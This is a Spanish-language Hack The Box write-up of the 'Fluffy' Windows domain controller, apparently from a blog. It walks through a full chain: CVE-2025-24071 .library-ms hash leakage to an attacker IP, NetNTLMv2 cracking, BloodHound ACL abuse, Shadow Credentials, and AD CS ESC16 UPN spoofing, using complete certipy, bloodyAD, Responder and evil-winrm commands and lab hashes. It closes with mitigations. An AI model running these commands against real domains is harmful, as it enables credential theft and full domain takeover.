---
title: "HTB Walkthrough: Fluffy"
date: 2026-09-13
draft: false
description: "Walkthrough completo de la máquina Fluffy de Hack The Box. Dificultad Easy, Windows Server 2019 Active Directory. CVE-2025-24071 filtración de hash NTLM via .library-ms en ZIP, cracking NetNTLMv2, abuso de ACLs con BloodHound, Shadow Credentials y AD CS ESC16 UPN Spoofing para suplantar al Administrator."
tags: ["HackTheBox", "Easy", "Windows", "ActiveDirectory", "SMB", "NTLM", "CVE-2025-24071", "BloodHound", "ShadowCredentials", "ADCS", "ESC16", "UPNSpoofing", "WinRM", "Certipy", "Responder", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough de **Fluffy** en Hack The Box. Máquina de dificultad **Easy** con **Windows Server 2019** como controlador de dominio Active Directory. Un recurso SMB con escritura contiene un `Upgrade_Notice.pdf` que nos apunta a **CVE-2025-24071**: un fichero `.library-ms` dentro de un `.zip` fuerza autenticación SMB saliente, filtrando el hash NetNTLMv2 de `p.agila`, que se crackea a texto claro. **BloodHound** revela ACLs anidadas `GenericAll`/`GenericWrite` que permiten ataques de **Shadow Credentials** sobre cuentas de servicio. Finalmente, **AD CS ESC16** (extensión de seguridad deshabilitada en la CA) permite UPN spoofing para suplantar a `Administrator`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                                                           |
|----------------|-----------------------------------------------------------------------------------------------------------------------------------|
| **Nombre**     | Fluffy                                                                                                                            |
| **SO**         | Windows Server 2019 (Controlador de Dominio)                                                                                      |
| **Dificultad** | Easy                                                                                                                              |
| **IP**         | 10.129.232.88                                                                                                                     |
| **Técnicas**   | CVE-2025-24071 · Cracking NetNTLMv2 · Abuso ACLs BloodHound · Shadow Credentials · AD CS ESC16 · UPN Spoofing · Pass-the-Hash   |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.232.88
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

> **💡 Superficie de ataque:** El juego de puertos (Kerberos, LDAP, SMB, ADWS, WinRM) es característico de un **controlador de dominio Active Directory**. Todos los vectores de ataque pasan por protocolos AD.

### 1.2 Escaneo de Versiones

```bash
nmap -sC -sV -p389,636 10.129.232.88
```

```
389/tcp open  ldap  Microsoft Windows Active Directory LDAP
              (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: SAN: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

> **⚠️ Desfase horario detectado:** El skew de ~7h causará fallos en la autenticación Kerberos hasta que sincronicemos el reloj. Lo abordaremos cuando se convierta en bloqueante.

---

## 2. Enumeración SMB

Con las credenciales iniciales proporcionadas (`j.fleischman` : `J0elTHEM4n1990!`):

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!'
```

```
Disk        Permissions
----        -----------
ADMIN$      NO ACCESS
C$          NO ACCESS
IPC$        READ ONLY
IT          READ, WRITE
NETLOGON    READ ONLY
SYSVOL      READ ONLY
```

El recurso `IT` tiene acceso de **lectura y escritura**. Listamos su contenido:

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' -r "IT"
```

```
Everything-1.4.1.1026.x64/
Everything-1.4.1.1026.x64.zip
KeePass-2.58/
KeePass-2.58.zip
Upgrade_Notice.pdf
```

> **💡 Hallazgo clave:** Un recurso con escritura al que presumiblemente accede personal de IT, con un `Upgrade_Notice.pdf` — merece leerlo antes de intentar cualquier exploit técnico.

---

## 3. Análisis de `Upgrade_Notice.pdf`

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --download "IT\Upgrade_Notice.pdf"
pdftotext 10.129.232.88-IT_Upgrade_Notice.pdf && cat 10.129.232.88-IT_Upgrade_Notice.txt
```

```
FLUFFY — Patch Announcement: Mandatory Timeslot Booking for Critical Updates

Recent Vulnerabilities
CVE ID              Severity
CVE-2025-24996       Critical
CVE-2025-24071       Critical
CVE-2025-46785       High
CVE-2025-29968       High
CVE-2025-21193       Medium
CVE-2025-3445        Low
```

> **💡 Insight clave:** El departamento de IT nos está anunciando los CVEs que les preocupan — incluido **CVE-2025-24071**, que filtra hashes NTLM mediante un fichero `.library-ms` dentro de un `.zip`. Ya tenemos acceso de escritura al recurso `IT` que usa el personal de IT.

---

## 4. CVE-2025-24071 — Filtración NTLM vía `.library-ms`

### 4.1 Vulnerabilidad

Un fichero `.library-ms` puede declarar una carpeta remota (`\\<IP_atacante>\share`) como parte de una "biblioteca" de Windows. Cuando el Explorador de Windows indexa o previsualiza el `.zip`, resuelve esa ruta remota — generando una **autenticación SMB saliente** con el hash NetNTLMv2 del usuario.

```
Flujo normal:    usuario abre ZIP → Explorer previsualiza contenidos localmente
Flujo malicioso: ZIP contiene .library-ms con ruta UNC remota
                 → Explorer resuelve \\<atacante>\share → autenticación SMB enviada
                 → atacante con Responder captura hash NetNTLMv2
```

### 4.2 Generación del Payload

```bash
python3 cve_2025_24071.py -n test -i 10.10.15.193 -s IT
```

```
[+] Wrote ./test.library-ms
[+] Wrote ./test.zip
[+] Removed intermediate test.library-ms
[+] Done. Deliver ./test.zip to the target and get it extracted.
```

### 4.3 Entrega del Payload

```bash
smbclient '//10.129.232.88/IT' -U 'j.fleischman%J0elTHEM4n1990!'
smb: \> put test.zip
smb: \> exit
```

### 4.4 Captura y Cracking del Hash

```bash
responder -I tun0
```

```
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:ca1ffb03f3cc9670:15DBBA15...
```

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O --force
```

```
P.AGILA::FLUFFY:...:prometheusx-303
```

> **🔑 Credenciales obtenidas:** `p.agila : prometheusx-303`

---

## 5. Enumeración de Active Directory — BloodHound

```bash
bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' \
    -dc 'dc01.fluffy.htb' -c all -ns 10.129.232.88
```

```
INFO: Found AD domain: fluffy.htb
INFO: Found 1 computers
INFO: Found 10 users
INFO: Found 54 groups
```

En BloodHound, marcamos `p.agila` como *owned* y revisamos **Outbound Object Control → Transitive Object Control**:

1. `p.agila` ∈ grupo **`Service Account Managers`**
2. `Service Account Managers` tiene **`GenericAll`** sobre el grupo **`Service Accounts`**
3. `Service Accounts` tiene **`GenericWrite`** sobre `ca_svc`, `winrm_svc` y `ldap_svc`
4. `winrm_svc` ∈ **`Remote Management Users`** → puede autenticarse por WinRM

> **💡 Cadena de ataque:** Si abusamos del `GenericAll` para añadirnos al grupo `Service Accounts`, heredamos `GenericWrite` sobre las cuentas de servicio. `GenericWrite` sobre un objeto de usuario permite un ataque de **Shadow Credentials** — añadir una clave pública alternativa sin conocer ni cambiar la contraseña.

---

## 6. Abuso de ACLs y Shadow Credentials

### 6.1 Unirse a `Service Accounts`

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 \
    add groupMember 'service accounts' p.agila
```

```
[+] p.agila added to service accounts
```

```bash
echo "10.129.232.88 fluffy.htb dc01.fluffy.htb" | sudo tee -a /etc/hosts
```

### 6.2 Shadow Credentials sobre `winrm_svc`

`GenericWrite` sobre un objeto de usuario permite modificar su atributo `msDS-KeyCredentialLink`. Añadiendo una clave pública que controlamos, nos autenticamos como esa cuenta mediante **PKINIT** sin conocer su contraseña y recuperamos su hash NT vía U2U.

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
```

```
NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

```
Flujo normal:    autenticación con contraseña → TGT Kerberos emitido
Flujo malicioso: GenericWrite → añadir clave pública a msDS-KeyCredentialLink
                 → autenticación PKINIT con nuestra clave privada → U2U → hash NT sin contraseña
```

---

## 7. User Flag

```bash
evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
```

```
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
```

> 🔑 User flag obtenida.

---

## 8. Escalada de Privilegios — AD CS ESC16

### 8.1 Localizar la CA

```bash
nxc ldap 10.129.232.88 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
```

```
ADCS  Found PKI Enrollment Server: DC01.fluffy.htb
ADCS  Found CN: fluffy-DC01-CA
```

```bash
certipy find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -dc-ip 10.129.232.88 -vulnerable -enabled -stdout
```

```
[!] Vulnerabilities
ESC16 : Security Extension is disabled.
```

> **⚠️ ESC16:** La CA tiene deshabilitada la extensión `szOID_NTDS_CA_SECURITY_EXT`, que normalmente incluye el SID del solicitante en los certificados emitidos. Sin ella, el controlador de dominio usa un **mapeo débil por UPN** — lo que permite suplantar cualquier cuenta cuyo `userPrincipalName` podamos igualar, incluida `Administrator`.

### 8.2 Obtener el Hash NT de `ca_svc`

El primer intento falla por el desfase horario detectado con Nmap:

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
# [-] KRB_AP_ERR_SKEW(Clock skew too great)
```

```bash
ntpdate 10.129.232.88
# CLOCK: time stepped by 1112.160389
```

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
```

```
NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

### 8.3 Explotación ESC16 — UPN Spoofing

**Paso 1 — Establecer el UPN de `ca_svc` como `administrator`:**

Con `GenericWrite` sobre `ca_svc` podemos modificar su `userPrincipalName` directamente:

```bash
certipy account update -username 'ca_svc@fluffy.htb' \
    -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -user ca_svc -upn 'administrator'
```

```
[*] Updated 'ca_svc':
    userPrincipalName : administrator
```

**Paso 2 — Solicitar certificado mientras el UPN es `administrator`:**

```bash
certipy req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -dc-ip 10.129.232.88 -target 'dc01.fluffy.htb' \
    -ca 'fluffy-DC01-CA' -template 'User'
```

```
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

```
Flujo normal:    certificado incluye SID → DC mapea cert a cuenta por SID
Flujo malicioso: ESC16 (sin extensión de seguridad) → DC mapea cert a cuenta por UPN
                 → UPN de ca_svc = "administrator" → cert emitido como "administrator"
                 → certipy auth → hash NT de Administrator
```

**Paso 3 — Restaurar el UPN original (limpieza):**

```bash
certipy account update -username "p.agila@fluffy.htb" -p "prometheusx-303" \
    -user ca_svc -upn 'ca_svc@fluffy.htb'
```

**Paso 4 — Autenticar con el certificado:**

```bash
certipy auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88
```

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

> **🔑 Hash NT de Administrator obtenido:** Pass-the-Hash a WinRM completa la escalada.

---

## 9. Root Flag

```bash
evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

> 🏁 Root flag obtenida.

---

## 10. Resumen y Lecciones Aprendidas

**Cadena de compromiso:**

1. **Reconocimiento** → Enumeración SMB con `j.fleischman` revela recurso `IT` con escritura.
2. **Recopilación de inteligencia** → `Upgrade_Notice.pdf` lista CVE-2025-24071 como parche crítico pendiente.
3. **CVE-2025-24071** → `.library-ms` dentro de `test.zip` subido al recurso `IT` → Responder captura hash NetNTLMv2 de `p.agila` → hashcat crackea a `prometheusx-303`.
4. **BloodHound** → `p.agila` → `GenericAll` sobre grupo `Service Accounts` → `GenericWrite` sobre `winrm_svc`.
5. **Shadow Credentials** → `bloodyAD` añade `p.agila` a `Service Accounts` → `certipy shadow auto` sobre `winrm_svc` → hash NT → WinRM → `user.txt`.
6. **ESC16** → `certipy find` revela extensión de seguridad deshabilitada en `fluffy-DC01-CA` → `ntpdate` corrige desfase → Shadow Credentials sobre `ca_svc` → hash NT.
7. **UPN Spoofing** → UPN de `ca_svc` = `administrator` → `certipy req` con plantilla User → certificado con UPN `administrator` → `certipy auth` → hash NT de Administrator → WinRM → `root.txt`.

**Qué aprendí de esta máquina:**

- **CVE-2025-24071 es un ataque sin interacción del usuario sobre bibliotecas de Windows.** La víctima no necesita abrir el fichero ni ejecutar nada — el Explorador de Windows resuelve automáticamente las rutas UNC de `.library-ms` durante la indexación. Acceso de escritura a un recurso compartido que usa el personal de IT es suficiente para capturar credenciales de cualquiera que lo explore.

- **Un PDF del departamento de IT puede ser la mejor fuente de reconocimiento.** El `Upgrade_Notice.pdf` nombraba el CVE exacto a explotar. En compromisos reales, los documentos internos revelan frecuentemente qué sabe el objetivo sobre sus propias vulnerabilidades — siempre leer los ficheros encontrados en recursos accesibles antes de alcanzar exploits técnicos.

- **El análisis de control transitivo de BloodHound es indispensable en AD.** La cadena `p.agila → Service Account Managers → Service Accounts → winrm_svc/ca_svc` requeriría una enumeración manual significativa sin el grafo de BloodHound. Marcar cada cuenta comprometida como "owned" y seguir los caminos de salida es el flujo de trabajo estándar.

- **Shadow Credentials es una alternativa sigilosa a los cambios de contraseña.** La modificación de `msDS-KeyCredentialLink` no cambia la contraseña, no dispara eventos de "contraseña cambiada" y no bloquea la cuenta. Solo es detectable mediante monitorización específica del atributo.

- **ESC16 es una mala configuración a nivel de CA, no de plantilla de certificado.** A diferencia de ESC1 (que requiere una plantilla enrollable con control de SAN), ESC16 afecta a todos los certificados emitidos por la CA. Deshabilitar la extensión de seguridad debilita retroactivamente todos los mapeos de certificados del dominio.

- **El desfase horario no es solo una molestia — es una señal.** El error `KRB_AP_ERR_SKEW` en el primer intento de Shadow Credentials sobre `ca_svc` era esperado desde el escaneo de Nmap. En entornos reales, un desfase horario elevado en un DC indica frecuentemente VMs mal configuradas o suspendidas — merece reportarse como hallazgo independiente.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| Recurso `IT` con escritura para usuarios no administrativos | Mínimo privilegio en ACLs; separar distribución de solo lectura de recursos de subida |
| CVE-2025-24071 (`.library-ms` en `.zip`) | Aplicar parche de Microsoft; filtrar `.library-ms` en política del recurso; bloquear NTLM saliente |
| NetNTLMv2 crackeable offline | Deshabilitar NTLM donde sea posible; forzar Kerberos; contraseñas robustas + SMB signing |
| ACLs de AD excesivamente permisivas (`GenericAll`/`GenericWrite` anidadas) | Auditar ACLs periódicamente con BloodHound; evitar cadenas de delegación que terminen en cuentas privilegiadas |
| Shadow Credentials (`msDS-KeyCredentialLink`) | Monitorizar escrituras al atributo; restringir qué principals pueden escribirlo |
| ESC16 (extensión de seguridad deshabilitada, mapeo débil por UPN) | Habilitar `StrongCertificateBindingEnforcement`; restringir modificación de UPN |
| Desfase horario elevado | Sincronizar todos los hosts contra una fuente NTP fiable |
